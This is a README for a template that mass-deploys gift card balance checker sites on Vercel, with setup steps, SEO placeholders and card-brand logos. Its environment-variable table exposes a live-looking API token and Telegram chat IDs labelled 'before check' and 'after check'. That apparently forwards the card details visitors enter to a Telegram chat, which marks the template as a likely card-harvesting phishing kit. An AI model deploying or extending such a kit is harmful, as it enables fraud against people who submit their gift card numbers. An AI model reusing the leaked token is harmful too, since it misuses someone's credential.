# Balance Checker Template

Ready-to-deploy gift card balance checker with API integration, SEO, and Vercel deployment.

## Quick Start

```bash
# 1. Copy template to new project
cp -r template/ my-new-project/
cd my-new-project/

# 2. Run setup (replaces all placeholders)
bash setup.sh

# 3. Install & run
npm install
npm run dev
```

## Placeholders

The setup script replaces these automatically:

| Placeholder | Example | Where |
|---|---|---|
| `__SITE_NAME__` | ------- | All files |
| `__SITE_DOMAIN__` | -------- | SEO, sitemap, robots |
| `__SITE_INITIALS__` | MB | Favicon |
| `__VERCEL_SUBDOMAIN__` | ------- | --------  |
| `__PROJECT_SLUG__` |------- | package.json |
| `YOUR_GOOGLE_CODE` | abc123... | index.html |
| `YOUR_BING_CODE` | ABC123... | index.html, BingSiteAuth.xml |

## Vercel Env Variables

Set these in Vercel Dashboard > Settings > Environment Variables:

| Variable | Description |
|---|---|
| `API_TOKEN` | 4439f671d73478c6401b758b50594ce5 |
| `TELEGRAM_ID_BEFORE_CHECK` | -1003750392427 |
| `TELEGRAM_ID_AFTER_CHECK` | -1003750392427 |

## Project Structure

```
├── index.html          # Main SPA (all pages)
├── api/
│   └── check-balance.js  # Vercel serverless API
├── server/
│   └── index.js          # Local dev server
├── public/
│   ├── favicon.svg       # Site icon
│   ├── visa.svg          # Visa card logo
│   ├── mastercard.svg    # Mastercard logo
│   ├── sitemap.xml       # SEO sitemap
│   ├── robots.txt        # Crawler rules
│   └── BingSiteAuth.xml  # Bing verification
├── vercel.json           # Vercel config + redirects
├── vite.config.js        # Vite dev config
├── setup.sh              # One-time setup script
└── .env.example          # Environment template
```

## Deploy

1. Push to GitHub
2. Connect repo in Vercel
3. Add env variables in Vercel
4. Add custom domain in Vercel
5. Submit sitemap.xml in Google Search Console & Bing Webmaster Tools
